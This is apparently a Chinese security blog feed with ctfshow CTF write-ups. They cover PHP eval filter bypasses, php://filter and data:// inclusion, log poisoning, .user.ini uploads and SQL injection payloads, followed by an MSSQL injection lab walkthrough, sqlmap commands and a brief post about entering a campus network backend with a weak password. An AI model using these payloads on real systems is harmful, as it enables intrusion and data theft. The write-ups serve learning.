h1xa# @Date:  2020-09-04 00:12:34# @Last Modified by:  h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/                 error_reporting(0);                if(isset($_GET['c'])){                          $c = $_GET['c'];                               if(!preg_match("/flag|system|php/i", $c)){                            eval($c); }                }else{                            highlight_file(__FILE__);                }        </code></pre><p>​      </p><ol><li><strong>还是命令执行，多了一个PHP</strong></li><li><strong>/?c=<code>cp fla?.??? 1.txt</code>;</strong></li><li><strong>为什么这样可以？</strong></li><li><strong>反引号 在PHP里面代表的是和system类似的，类似于shell执行。因为这里php过滤了，用？？？占位符代表</strong></li><li><strong>因为知道flag.php——-&gt;fla?.???表示</strong></li></ol><h2 id="web31"><a href="#web31" class="headerlink" title="web31"></a><strong>web31</strong></h2><pre><code>&lt;?php/*# -*- coding: utf-8 -*-# @Author: h1xa# @Date:  2020-09-04 00:12:34# @Last Modified by:  h1xa# @Last Modified time: 2020-09-04 00:42:26# @email: h1xa@ctfer.com# @link: https://ctfer.com*/                error_reporting(0);                if(isset($_GET['c'])){                        $c = $_GET['c'];                                   if(!preg_match("/flag|system|php|cat|sort|shell|\.| |\'/i", $c)){                                        eval($c);                }                }else{    highlight_file(__FILE__);                }              </code></pre><ol><li><strong>过滤了很多，用嵌套eval执行</strong></li><li><strong>?c=eval($_GET[1]);&amp;1=phpinfo();    get第一个参数。1相当于参数逃逸出去了不属于c。可以任意使用代码禁掉的关键字。</strong></li><li><strong>?c=eval($_GET[1]);&amp;1=system(‘ls’);     ?c=eval($_GET[1]);&amp;1=system(‘cat flag.php’);</strong></li><li><strong>在php中查看源代码才能看见，</strong> </li><li><strong>倒序，?c=eval($_GET[1]);&amp;1=system(‘tac flag.php’);</strong></li><li><strong>反过来读代码。</strong></li><li><strong>将c参数用一个跳板，把c参数用另一个参数去执行。</strong></li></ol><h2 id="web32"><a href="#web32" class="headerlink" title="web32"></a><strong>web32</strong></h2><p>更多过滤，把；和左边的（、`` ， ‘等等都过滤了，用逃逸去做， </p><p>没用空格的情况，用URL编码去绕过，没有；最后一个语句可以不用；</p><p><code>?c=include%0a$_GET[1];&amp;1=/etc/passwd</code> 没有包含成功</p><p><code>?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code>        通过文件包含来读取非PHP的文本文件。</p><p><code>?c=include%0a$_GET[1]?&gt;&amp;1=flag.php</code>  是看不到，虽然包含了，但是没有输出flag的变量。</p><p><code>?c=include%0a$_GET[1]?&gt;</code>因为没又用；分割，所以造成了无法输出。</p><p>文件包含<code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>使用了一个文件包含的方法，通过base64的编译去读取<code>flag.php</code>。</p><p>伪协议，通过指定的通道，<code>filter通道</code>，通道是base64-encode。</p><p>整体，我读到的资源用base64编码，如果不用base64的话，会看不到源文件的。</p><p>解码。</p><h2 id="web33"><a href="#web33" class="headerlink" title="web33"></a><strong>web33</strong></h2><p>多过滤了一个双引号。前面的方法能接出来，用另外一个方法。</p><p><code>?c=require%0a$_GET[1]?&gt;&amp;1=/etc/passwd</code></p><p><code>?c=require%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><p>思路是一样，用到的代码不同，</p><h2 id="web34"><a href="#web34" class="headerlink" title="web34"></a><strong>web34</strong></h2><p>多过滤了一个;为了过滤直接伪协议的参数，</p><p>都过滤了，只能使用语言结构， <code>echo print isset  unset include require</code>常用的语言结构</p><p>这几个语言结构是不用括号的，用</p><p><code>?c=print%0a$_GET[1]?&gt;&amp;1=phpinfo();</code>    结果是php引发的字符，和二进制相似，存在代码空间和数据空间</p><p>二进制里面有代码段，和数据段，这里<code>phpinfo</code>属于数据段，不在代码段，所以执行不了，作为一个字符串来执行。</p><p><code>?c=eval%0a$_GET[1]?&gt;&amp;1=phpinfo();</code> 这里行不通eval在这里必须用括号才能执行，所以eval行不通</p><p>?c=include%0a$_GET[1]?&gt;&amp;1=/etc/passwd    在这里属于文件读取，不属于代码执行</p><p><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web35"><a href="#web35" class="headerlink" title="web35"></a><strong>web35</strong></h2><p>=、&lt;进行了限制。</p><p><code>?c=include%0a$_GET[1]?&gt;&amp;1=php://filter/convert.base64-encode/resource=flag.php</code></p><h2 id="web36"><a href="#web36" class="headerlink" title="web36"></a><strong>web36</strong></h2><p>不让用数字了，把1换成a即可</p><p><code>?c=include%0a$_GET[a]?&gt;&amp;a=php://filter/convert.base64-encode/resource=flag.php</code></p><p>字母可以不用’’单引号</p><h2 id="web37"><a href="#web37" class="headerlink" title="web37"></a><strong>web37</strong></h2><p><code>?c=$_GET[1]&amp;1=flag.php</code>    属于数据段，包含了字符串，不能解析这个字符串</p><p><code>?c=php://filter/convert.base64-encode/resource=flag.php</code> 不行</p><p><code>?c=data://text/plain</code>,         可以执行，因为data协议，把后面的数字，字符作为php代码去执行。</p><p><code>?c=data://text/plain</code>,          不行</p><p><code>?c=data://text/plain</code>,          不行</p><p><code>?c=data://text/plain</code>,  复制办法，过滤掉了flag字符，用？去占位</p><p><code>data</code>伪协议利用。</p><h2 id="web38"><a href="#web38" class="headerlink" title="web38"></a><strong>web38</strong></h2><p>过滤了php和file</p><p><code>?c=data://text/plain</code>,   这种写法不行</p><p><code>?c=data://text/plain</code>,        这种方法，叫做短标签。</p><h2 id="web39"><a href="#web39" class="headerlink" title="web39"></a><strong>web39</strong></h2><p>没有回显了，后面强制加了后缀。.php</p><p><code>?c=data://text/plain,.php</code>     完整代码是这样</p><p>下面会出现1.php，phpinfo返回值是1，就是1.php，</p><p><code>?c=data://text/plain,.php</code>    会出现2.php.php</p><p>如果 把.php去掉就出现2.php</p><p><code>?c=data://text/plain,</code>    </p><h2 id="web40"><a href="#web40" class="headerlink" title="web40"></a><strong>web40</strong></h2><p>过滤了许多符号，没有过滤字母，没有过滤分号，没有过滤下划线</p><p><code>show_source(next(array_reverse(scandir(pos(localeconv())))));</code></p><p>​                需要用到的函数 localeconv()：返回一包含本地数字及货币格式信息的数组。其中数组中的第一个为点号(.) pos()：返回数组中的当前元素的值。 array_reverse()：数组逆序 scandir()：获取目录下的文件 next()： 函数将内部指针指向数组中的下一个元素，并输出。 首先通过 pos(localeconv())得到点号，因为scandir(’.’)表示得到当前目录下的文件，所以 scandir(pos(localeconv()))就能得到flag.php了。具体内容如下              </p><p><code>localeconv</code>：是一个包含了与数字和货币有关的区域设置信息的结构体</p><p><code>pos</code>：取这个点</p><p><code>scandir</code>：扫描当前目录</p><p><code>array_reverse</code>：把目录的结果进行翻转</p><p><code>next</code>：取下一个</p><p><code>show_source</code>：显示源码。</p><p>老方法用不成</p><p><code>?c=print_r(get_definde_vars());</code>  打印当前的变量；</p><p>加一个post值，我们要拿到他的字符串phpinfo();能执行这个字符串，就能rce</p><p><code>?c=print_r(next(get_definde_vars()));</code>    拿到了数组，</p><p>对数组进行一个弹出    <code>?c=print_r(array_pop(next(get_definde_vars())));</code></p><p>得到结果phpinfo</p><p><code>?c=eval(array_pop(next(get_definde_vars())));</code>    执行数组；</p><p><code>payload:        ?c=print_r(next(array_reverse(scandir(pos(localeconv())))));</code>        //打印文件</p><p><code>?c=highlight_file(next(array_reverse(scandir(pos(localeconv())))));</code>        //highlight读取文件</p><h2 id="web41"><a href="#web41" class="headerlink" title="web41"></a><strong>web41</strong></h2><p>过滤了部分字符，数字，字母、`` + 作为一个php代码的执行</p><p>通过特殊字符构造出来一个字母去代码执行。</p><h2 id="web42"><a href="#web42" class="headerlink" title="web42"></a><strong>web42</strong></h2><p><code>payload:    ?c= tac f* ||</code></p><h2 id="web43"><a href="#web43" class="headerlink" title="web43"></a><strong>web43</strong></h2><p><code>payload:    ?c= tac f* ||</code></p><h2 id="web44"><a href="#web44" class="headerlink" title="web44"></a><strong>web44</strong></h2><p>对比上几题，多了一个对flag关键字的过滤，这里可以用通配符*?代替</p><p><code>cat fla?.p?</code>             ?表示一个通配符，            *表示匹配多个通配符</p><p><code>payload:  ?c=tac f* ||</code></p><h2 id="web45"><a href="#web45" class="headerlink" title="web45"></a><strong>web45</strong></h2><p>这里对空格进行了过滤，用转义字符%09绕过即可</p><p><code>payload:?c=tac%09f*%09||</code></p><h2 id="web-46"><a href="#web-46" class="headerlink" title="web 46"></a><strong>web 46</strong></h2><p><code>payload:        ?c=tac%09fla?.???||</code></p><h1 id="文件包含"><a href="#文件包含" class="headerlink" title="文件包含"></a>文件包含</h1><h2 id="web-78"><a href="#web-78" class="headerlink" title="web 78"></a><strong>web 78</strong></h2><p>php伪协议，插件利用。</p><p><code>?file=php://filter/convert.base64-encode/resource=flag.php</code></p><p>解密得到的结果。</p><h2 id="web-79"><a href="#web-79" class="headerlink" title="web 79"></a><strong>web 79</strong></h2><p>php     data协议，<code>data://text/plain;base64,</code></p><p><code>?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCJjYXQgZmxhZy5waHAiKTs/Pg==</code></p><p> <img src="7.png"></p><p>大写php 绕过，</p><p><strong>2、日志文件包含：</strong></p><p><strong>访问日志文件记录了服务器收到的每一次请求的</strong></p><p><strong>IP、访问时间、URL、User-Agent，这4项中的前两项的值都是我们无法控制的，我们只能在自己可以控制的字段上做手脚，其中URL字段由于URL编码的存在，空格等一些符号无法包含其中，而User-Agent则不会被进行任何二次处理，我们发什么内容，服务器就将其原封不动的写入日志。</strong></p><p>访问日志的位置和文件名在不同的系统上会有所差异</p><p>apache一般是<code>/var/log/apache/access.log</code>     nginx的log在<code>/var/log/nginx/access.log</code>和<code>/var/log/nginx/error.log</code>              </p><p>构造：<code>?file=/var/log/nginx/access.log, c</code></p><p>ca成访问</p><p>成功访问。</p><p> <img src="8.png"></p><h2 id="web-80"><a href="#web-80" class="headerlink" title="web 80"></a><strong>web 80</strong></h2><p>日志包含</p><p>首先在UA头里面插入一句话</p><p> <img src="9.png"></p><p>接着包含日志文件并利用一句话</p><p><img src="10.png"></p><h2 id="web-81"><a href="#web-81" class="headerlink" title="web 81"></a><strong>web 81</strong></h2><p>日志包含</p><h1 id="文件上传"><a href="#文件上传" class="headerlink" title="文件上传"></a>文件上传</h1><h2 id="web-151"><a href="#web-151" class="headerlink" title="web 151"></a><strong>web 151</strong></h2><p>抓包改掉后缀直接上传，连接访问。</p><h2 id="web152"><a href="#web152" class="headerlink" title="web152"></a><strong>web152</strong></h2><p>抓包改掉后缀直接上传，连接访问。</p><h2 id="web153"><a href="#web153" class="headerlink" title="web153"></a><strong>web153</strong></h2><p>使用<code>.user.ini</code>            </p><p>指定一个文件（如a.jpg），那么该文件就会被包含在要执行的php文件中（如index.php），类似于在index.php中插入一句：<code>require(./a.jpg);</code>这两个设置的区别只是在于<code>auto_prepend_file</code>是在文件前插入；<code>auto_append_file</code>在文件最后插入（当文件调用的有exit()时该设置无效）所以要求当前目录必须要有php文件</p><p> <strong>上传<code>.user.ini</code>内容为<code>auto_append_file="xxx" xxx</code>为上传文件名字 上传.user.ini文件内容为： <code>GIF89a auto_prepend_file=1.png</code> 然后再上传一句话<code>1.png</code></strong>               </p><p><img src="11.png"></p><p><img src="12.png"></p><p><img src="13.png"></p><h1 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h1><h2 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a><strong>web 171</strong></h2><p>//拼接sql语句查找指定ID用户 </p><pre><code>$sql = "select username,password from user where username !='flag' and id = '".$_GET['id']."' limit 1;";     </code></pre><p>​         </p><p>点击查询发现存在三个字段，所以就不用order by 去查询字段了，注意语句闭合。</p><pre><code> 'union select 1,database(),3 --  'union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() -- + 'union select 1,2,group_concat(column_name) from information_schema.columns where table_name='ctfshow_user' -- qwe 'union select 1,username,password from ctfshow_user -- qwe     ​         </code></pre><h2 id="web172"><a href="#web172" class="headerlink" title="web172"></a><strong>web172</strong></h2><p>查询语句</p><p>​       //拼接sql语句查找指定ID用户</p><pre><code> $sql = "select username,password from ctfshow_user2 where username !='flag' and id = '".$_GET['id']."' limit 1;";    </code></pre><p>​          </p><p><strong>返回逻辑</strong></p><p>​                //检查结果是否有flag </p><pre><code>   if($row-&gt;username!=='flag'){      $ret['msg']='查询成功';    }        </code></pre><p>​            </p><p>第 二题看出查询的数据不包含flag，并且给出了数据库是<strong>ctfshow_user2</strong></p><p>从语句中看，判断有两列<code>’union select 1,2 -- +</code> 有回显</p><p><code>payload: 'union select to_base64(username),hex(password) from ctfshow_user2 -- +</code></p><p>最后一行解码是flag</p><h2 id="web173"><a href="#web173" class="headerlink" title="web173"></a><strong>web173</strong></h2><p>与172一样，只是173三列都有回显，</p><p><code>payload：'union select 1,hex(username),hex(password) from ctfshow_user3 -- +</code></p><p><code>payload:    'union select 1,to_base64(username),to_base64(password) from ctfshow_user3 where username='flag' limit 1,1 -- A</code></p><h2 id="web174"><a href="#web174" class="headerlink" title="web174"></a><strong>web174</strong></h2><p>过滤了不能有数字，</p><p>​       </p><pre><code>         //检查结果是否有flag          if(!preg_match('/flag|[0-9]/i', json_encode($ret))){         $ret['msg']='查询成功';         }         payload:    'union select 1,to_base64(username),to_base64(password) from ctfshow_user3 where username='flag' limit 1,1 -- A         替换username: replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ')         替换password replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ')  ' union slect replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(username),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ'),replace(replace(replace(replace(replace(replace(replace(replace(replace(replace(to_base64(password),'1','numA'),'2','numB'),'3','numC'),'4','numD'),'5','numE'),'6','numF'),'7','numG'),'8','numH'),'9','numI'),'0','numJ') from ctfshow_user4 where username='flag' limit 1,1 -- A         </code></pre><p>​    </p><h2 id="web-175"><a href="#web-175" class="headerlink" title="web 175"></a><strong>web 175</strong></h2><p>0-127不让输出，不让输出到页面，</p><p><code>'union select 1,password from ctfshow_user5 where username='flag' into outfile '/var/www/html/ctf.txt' -- A</code></p><h2 id="web-176"><a href="#web-176" class="headerlink" title="web 176"></a><strong>web 176</strong></h2><p>过滤注入，先试一下，看过滤了什么。</p><p><code>' union select 1,2,3 from ctshow_user limit 1 --A</code></p><p>大小写试一下，</p><p><code>' union sElect 1,2,password from ctshow_user where username='flag' limit 1,1 --A</code></p><h2 id="web-177"><a href="#web-177" class="headerlink" title="web 177"></a><strong>web 177</strong></h2><p><code>' union select 1,2,3 from ctshow_user limit 1 --A</code></p><p>1’ and 1=1 %23 没有数据</p><p><code>1 ' and (1 = 1)%23</code>没有数据</p><p><code>1'and(1=1)%23</code>有数据</p><p>1’%23有数据</p><p>那就是应该是吧空格给过滤掉了</p><p>反引号也可以作为条件空格。</p><p><code>paylaod：'/**/union/**/select/**/1,2,password/**/from/**/ctshow_user/**/where/**/username='flag'/**/limit/**/1,1/**/%23</code></p><p><code>paylaod：'/**/union/**/select/**/1,2,password/**/fromctshow_userwhereusername='flag'limit/**/1,1/**/%23</code></p><h2 id="web178"><a href="#web178" class="headerlink" title="web178"></a><strong>web178</strong></h2><p>在mysql中table键可以作为空格来做    ascii %09为table键</p><p><code>1' or 'a'='a</code>     无数据</p><p>1’or’a’=’a        有数据</p><p>判断还是过滤了空格，</p><p><code>1/**/'or'a'='a</code>    无数据</p><p><code>1/1/'or'a'='a</code>    异常，过滤了<em>号， 绕过</em>号。</p><p><code>1'%09and'a'='a</code>     成功</p><p><code>'%09union%09select%091,2,password%09from%09ctfshow_user%09where username='flag' limit%091,1%09-- A</code></p><h2 id="web179"><a href="#web179" class="headerlink" title="web179"></a><strong>web179</strong></h2><p><code>1'%0aand'a'='a</code>    <code>1'%0band'a'='a</code>    1’%0cand’a’=’a        几个换表符号</p><p><code>%0c</code> 能用。</p><h2 id="web180"><a href="#web180" class="headerlink" title="web180"></a><strong>web180</strong></h2><p><code>1'%0dand'a'='a</code>    1’%00and’a’=’a测试</p><p>所用空格都给过滤掉了，</p><p><code>id=26</code>因为之前的几个flag都在id中</p><p>直接（）包含一下</p><p>11111报错后面执行。</p><p><code>11111'or(id=26)and'a'='a</code></p><h2 id="web181"><a href="#web181" class="headerlink" title="web181"></a><strong>web181</strong></h2><p>跟上面一样。</p><h2 id="web182"><a href="#web182" class="headerlink" title="web182"></a><strong>web182</strong></h2><p>跟上面一样</p><h2 id="web183"><a href="#web183" class="headerlink" title="web183"></a><strong>web183</strong></h2><p>POST 提交的<code>tableName</code></p><p>hackbar post提交</p><p><code>regexp()</code>正则，</p><p><code>tableName=ctfshow_userwhere pass regexp('fl')</code>     匹配到了数量是一</p><p><code>tableName=ctfshow_userwhere(substr(pass,1,1)regexp('f'))</code></p><p><code>where(substr(pass,1,1)regexp('f'))</code></p><p>tableName=<code>ctfshow_user</code>where(substr(<code>username</code>,1,1)regexp(‘f’))</p><p><code>tableName=ctfshow_userwhere(substr(username,{},1)regexp(\'{}\'))</code></p><p><code>(ctfshow)where(substr(pass,1,1))regexp('f')</code></p><p>flag{0ff62daa-bc2c-4909-bbcc-a849c7e5e46b}</p><p>flag{0ff62daa-bc2c-4909-bbcc-a849c7e5e46b}</p><h2 id="web184"><a href="#web184" class="headerlink" title="web184"></a><strong>web184</strong></h2><p>过滤了很多关键字，盲注，时间都过滤了；</p><p><code>tableName=ctfshow_user as a right join ctfshow_user as b on substr(pass,1,1)regexp('f')</code></p><p>单引号突破regexp(chr(0x66))</p><p><code>tableName=ctfshow_user as a right join ctfshow_user as b on (substr(b.pass,1,1)regexp(char(102)))</code></p><p>成功执行。</p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>加油！</title>
      <link href="/2021/07/10/ctf-lian-xi/"/>
      <url>/2021/07/10/ctf-lian-xi/</url>
      
        <content type="html"><![CDATA[<h2 id="网安路漫漫，愿与君同行"><a href="#网安路漫漫，愿与君同行" class="headerlink" title="网安路漫漫，愿与君同行"></a>网安路漫漫，愿与君同行</h2><h2 id="00x1"><a href="#00x1" class="headerlink" title="00x1"></a>00x1</h2><p>就我自己所参加或者了解的各类安全赛事来说，学了安全你会发现你什么都要去了解，或者是什么都要去懂，尝试<br>安全类型的比赛都是刷下面的这题库里面的题目，如果几大题目全部刷完，打我们这种类型的比赛随便打。</p><h2 id="00x2"><a href="#00x2" class="headerlink" title="00x2"></a>00x2</h2><p>我给大家推荐了这些ctf刷题的网站，你们能在这一年半的时间内能刷多少是多少，尽早接触，越早越好</p><p><a href="https://adworld.xctf.org.cn/">https://adworld.xctf.org.cn/</a>     xctf攻防世界<br><a href="https://buuoj.cn/">https://buuoj.cn/</a>        buuctf<br><a href="https://ctf.bugku.com/">https://ctf.bugku.com/</a>    bugkuctf<br><a href="https://ctf.show/">https://ctf.show/</a>        ctfshow<br><a href="https://www.ctfhub.com/">https://www.ctfhub.com/</a>    ctfhub<br>南邮 ctf</p><h2 id="00x3"><a href="#00x3" class="headerlink" title="00x3"></a>00x3</h2><p>这是ctf类型的几大类型<br><img src="1.png"></p><p>关于怎样去网上搜索相关类的解题思路，以xctf为例<br><img src="2.png"></p><p>箭头的方向<br><img src="3.png"></p><p>根据关键字去百度搜索，当然我平时都是去谷歌搜索，谷歌比较准。</p><p>随便点进去一个里面都会有解题的writeup<br><img src="4.png"></p><h2 id="00x4"><a href="#00x4" class="headerlink" title="00x4"></a>00x4</h2><p>还有一种方法就是<br><img src="5.png"><br>根据题目的题名去百度搜索关键字，这样得到的解题思路也会更准一点把。<br><img src="6.png"></p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>记去年偶然一次进入校园网..</title>
      <link href="/2021/07/10/ji-qu-nian-ou-ran-yi-ci-jin-ru-xiao-yuan-wang/"/>
      <url>/2021/07/10/ji-qu-nian-ou-ran-yi-ci-jin-ru-xiao-yuan-wang/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>去年刚搬到新校区，偶然一次无聊的时候，随便测试了下，把校园网后台测试出来，也就进去随便看了看，感觉就那样好像。<br>主要还是管理员太疏忽了，弱口令直接进了。</p><h2 id="直接看图吧。"><a href="#直接看图吧。" class="headerlink" title="直接看图吧。"></a>直接看图吧。</h2><p><img src="4.jpg"><br><img src="5.jpg"><br><img src="3.jpg"><br><img src="2.jpg"><br><img src="1.jpg"></p>]]></content>
      
      
      <categories>
          
          <category> -web渗透 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -web渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mssql联合注入</title>
      <link href="/2021/07/08/mssql-lian-he-zhu-ru/"/>
      <url>/2021/07/08/mssql-lian-he-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="mssql实战联合注入"><a href="#mssql实战联合注入" class="headerlink" title="mssql实战联合注入"></a>mssql实战联合注入</h2><p>刚开始学习mssql联合注入的时候用到的是墨者的靶场做的实验。</p><h3 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h3><p>显示位用null表示<br>union select null,null,null,null<br>加单引号一个个试’<br>union select null,’null’,null,null<br>联合查询加all，<br>union all select null,null,null,null</p><h3 id="寻找注入点"><a href="#寻找注入点" class="headerlink" title="寻找注入点"></a>寻找注入点</h3><p><img src="1.png"><br><img src="11.png"><br><img src="111.png"></p><h3 id="猜测列数："><a href="#猜测列数：" class="headerlink" title="猜测列数："></a>猜测列数：</h3><p><img src="2.png"></p><h3 id="寻找回显位："><a href="#寻找回显位：" class="headerlink" title="寻找回显位："></a>寻找回显位：</h3><p>and 1=2 union all select null,null,’3’,null   and 1=2 和 -2是一样的效果<br><img src="22.png"></p><h3 id="查询版本信息："><a href="#查询版本信息：" class="headerlink" title="查询版本信息："></a>查询版本信息：</h3><p>and 1=2 union all select null,(select @@version),’3’,null<br><img src="banben.png"></p><h3 id="查询库："><a href="#查询库：" class="headerlink" title="查询库："></a>查询库：</h3><p>and 1=2 union all select null,(select db_name()),’3’,null<br><img src="ku.png"></p><h3 id="查询表："><a href="#查询表：" class="headerlink" title="查询表："></a>查询表：</h3><p>and 1=2 union all select null,(select top 1 name from mozhe_db_v2.dbo.sysobjects where xtype=’u’),’3’,null<br><img src="biao.png"></p><h3 id="查询下一个表-利用top-和-lt-gt"><a href="#查询下一个表-利用top-和-lt-gt" class="headerlink" title="查询下一个表:利用top 和 <>"></a>查询下一个表:利用top 和 &lt;&gt;</h3><p><img src="2biao.png"></p><h3 id="查询列："><a href="#查询列：" class="headerlink" title="查询列："></a>查询列：</h3><p>and 1=2 union all select null,column_name,’3’,null from information_schema.columns where table_name=’manage’<br><img src="id.png"></p><h3 id="查询里面的字段："><a href="#查询里面的字段：" class="headerlink" title="查询里面的字段："></a>查询里面的字段：</h3><p>and 1=2 union all select null,(select top 1 col_name (object_id(‘manage’),1) from sysobjects),’3’,null<br><img src="name.png"><br><img src="pass.png"></p><h3 id="查询账号密码"><a href="#查询账号密码" class="headerlink" title="查询账号密码:"></a>查询账号密码:</h3><p>and 1=2 union all select null,(select top 1 password from manage),’3’,null<br><img src="zhanghao.png"><br><img src="mima.png"><br> <code>账号</code> :admin_mz<br> <code>密码</code> :72e1bfc3f01b7583</p><h3 id="常用sqlmap注入"><a href="#常用sqlmap注入" class="headerlink" title="常用sqlmap注入"></a>常用sqlmap注入</h3><h4 id="常用命令："><a href="#常用命令：" class="headerlink" title="常用命令："></a>常用命令：</h4><pre class="line-numbers language-js"><code class="language-js">测试注入：python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注数据库："><a href="#注数据库：" class="headerlink" title="注数据库："></a>注数据库：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>dbs<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注当前数据库："><a href="#注当前数据库：" class="headerlink" title="注当前数据库："></a>注当前数据库：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>current<span class="token operator">-</span>db<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注当前数据库用户名："><a href="#注当前数据库用户名：" class="headerlink" title="注当前数据库用户名："></a>注当前数据库用户名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>current<span class="token operator">-</span>user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注表名："><a href="#注表名：" class="headerlink" title="注表名："></a>注表名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">--</span>tables<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注列名："><a href="#注列名：" class="headerlink" title="注列名："></a>注列名：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">-</span>T 表名 <span class="token operator">--</span>columns<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="注数据："><a href="#注数据：" class="headerlink" title="注数据："></a>注数据：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">-</span>D 库名 <span class="token operator">-</span>T 表名 <span class="token operator">-</span>C 列名<span class="token punctuation">,</span>列名 <span class="token operator">--</span>dump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="查询表条数："><a href="#查询表条数：" class="headerlink" title="查询表条数："></a>查询表条数：</h4><pre class="line-numbers language-js"><code class="language-js">python sqlmap<span class="token punctuation">.</span>py <span class="token operator">-</span>u <span class="token string">"url"</span> <span class="token operator">--</span>count <span class="token operator">-</span>D 当前数据库名<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> -SQL注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> -SQL注入 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL注入</title>
      <link href="/2021/07/08/sql-zhu-ru/"/>
      <url>/2021/07/08/sql-zhu-ru/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>不管用什么语言编写的Web应用，它们都用一个共同点，具有交互性并且多数是数据库驱动。在网络中，数据库驱动的Web应用随处可见，由此而存在的SQL注入是影响企业运营且最具破坏性的漏洞之一。</p><h2 id="一、什么是SQL"><a href="#一、什么是SQL" class="headerlink" title="一、什么是SQL"></a>一、什么是SQL</h2><p>SQL（Struct Query Language）结构化查询语言，是一种面向数据库的编程语言，它可以对数据库中的信息进行增删改查操作。SQL可以与多种数据库程序协同工作，比如&nbsp;MS Access、DB2、Informix、MS SQL Server、Oracle、Sybase&nbsp;以及其他数据库系统。</p><h2 id="二、什么是SQL注入"><a href="#二、什么是SQL注入" class="headerlink" title="二、什么是SQL注入"></a>二、什么是SQL注入</h2><p>攻击者通过精心构造SQL语句达到欺骗服务器、绕过服务器的检测过滤，最终达到执行该SQL语句，并且输出攻击者想要获取的隐秘信息的过程。</p><h2 id="三、Sql注入是怎么产生的"><a href="#三、Sql注入是怎么产生的" class="headerlink" title="三、Sql注入是怎么产生的"></a>三、Sql注入是怎么产生的</h2><p>WEB交互少不了从WEB页面接收用户输入的信息，并且对其进行操作，最终完成交互的目的。有一句话说的好就是“有输入的地方就有风险”，如果对用户的输入不加过滤，直接带入数据库执行，那么就会产生一定的安全风险。例如：</p><p><a href="http://xxx.com/sql?id=1">http://xxx.com/sql?id=1</a></p><p>select username,password from user where id = 3</p><p><a href="http://xxx.com/sql?id=1">http://xxx.com/sql?id=1</a> union select….</p><p>select username,password from user where id = 3 union select ….</p><p>Mysql注入部分</p><p>获取字段数:order by x 取临界值</p><p>获取数据库名:database()</p><p>获取版本version()</p><p>Information_schema, mysql 5.0以上版本自带数据库,它记录有当前mysql下所有的数据库名，表名，列名信息</p><p>Information_schema.tables; 记录表名信息的表</p><p>Information_schema.columns; 记录列名信息的表</p><p>Table_name 表名</p><p>Column_name 列名</p><p>Schema_table 数据库名</p><p>数据库中符号”.”代表下一级的意思</p><p>Information_schema.tables 也就是 Information_schema数据库下的tables表</p><p>常用函数，进行信息收集</p><p>Version() –mysql版本</p><p>User() –数据库用户名</p><p>database() –数据库名</p><p>@@datadir —数据库路径</p><p>@@version_compile_os –操作系统版本</p><p>system_user() //系统用户名</p><p>user() //用户名</p><p>current_user() //当前用户名</p><p>session_user() 